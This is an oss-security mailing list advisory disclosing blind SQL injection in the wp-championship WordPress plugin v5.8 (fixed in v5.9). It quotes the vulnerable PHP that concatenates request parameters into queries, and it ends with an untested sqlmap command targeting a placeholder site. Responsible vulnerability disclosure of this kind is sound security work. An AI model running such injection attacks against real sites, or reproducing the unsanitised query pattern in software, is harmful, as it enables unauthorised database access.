  oss-security - Blind SQL injection in wp-championship wordpress plugin v5.8            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 09 Nov From: Larry Cashdollar <larry0@...com> To: Open Security <oss-security@...ts.openwall.com> Subject: Blind SQL injection in wp-championship wordpress plugin v5.8  Title: Blind SQL injection in wp-championship wordpress plugin v5.8 Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/wp-championship/ Vendor: https://profiles.wordpress.org/tuxlog/ http://www.tuxlog.de/ Vendor Notified: fixed in v5.9 Vendor Contact: webmaster@...log.de Description: wp-championship is a plugin for wordpress letting you play a guessing game of a tournament e.g. soccer. Vulnerability: The following lines do not properly sanitize user input resulting in SQLi, injection points are POST request To user, isadmin,mail service,mailresceipt,stellv,champtipp and tippgroup. Also GET requests to userid.  The code from cs_admin_users.php is as follows:  69                                 $sql="select count(*) as anz from $cs_users where userid=".$_POST['user'].";";  70                                 $results = $wpdb->get_row($sql); . .  74                                         $sql = "insert into ". $cs_users ." values (". $_POST['user'] . "," . $_POST['isadmin'] . "," . $ _POST['mailservice'] . "," .$_POST['mailreceipt'] . "," . $_POST['stellv'] . ['tippgroup']."');";  75                                         $results = $wpdb->query($sql); . . 86                                 $sql = "update ".$cs_users." set admin=" . $_POST['isadmin'] . ", mailservice=" . $_POST['mailservice'] .    ", mailreceipt=" . $_POST['mailreceipt'] . ",stellvertreter=" . $_POST['stellv'] . ",champion=" . $_POST['champtipp'] . ", tippgroup='".$ _POST['tippgroup']."' where userid=".$_POST['user'].";";  87                                 $results = $wpdb->query($sql); . . 98                         $sql= "delete from ".$cs_users." where userid=".$_GET['userid'].";"; 99                         $results = $wpdb->query($sql); . .                         $sql= "select * from  $cs_users where userid=".$_GET['userid'].";";                         $results = $wpdb->get_row($sql); CVEID: OSVDB: Exploit Code: Untested:  $ sqlmap -u  'http://wp.site:80/wp-admin/wp-championship/cs_admin_users.php&userid=' --data="isadmin=1&user" --cookie=AUTH_COOKIE_HERE --level=5 --risk=3 Screen Shots: Advisory:     Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      